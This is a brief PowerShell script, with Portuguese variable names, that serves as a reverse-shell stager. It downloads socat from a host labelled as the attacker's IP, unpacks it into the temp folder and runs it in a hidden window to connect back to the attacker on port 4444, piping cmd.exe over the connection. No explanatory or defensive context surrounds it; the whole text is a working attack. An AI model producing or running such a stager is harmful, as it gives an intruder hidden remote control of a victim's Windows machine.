$ip = "IP_DO_ATACANTE";
$porta = 4444;
$url_download = "http://$ip/socat.zip";
Invoke-WebRequest -Uri "http://$ip/socat.zip" -OutFile "$env:TEMP\socat.zip";
Expand-Archive -Path "$env:TEMP\socat.zip" -DestinationPath "$env:TEMP\socat" -Force;
Start-Process -FilePath "$env:TEMP\socat\socat-2.0.0-b8-windows-master\socat.exe" -ArgumentList "tcp:$ip:$porta", "exec:'cmd.exe',pipes" -WindowStyle Hidden
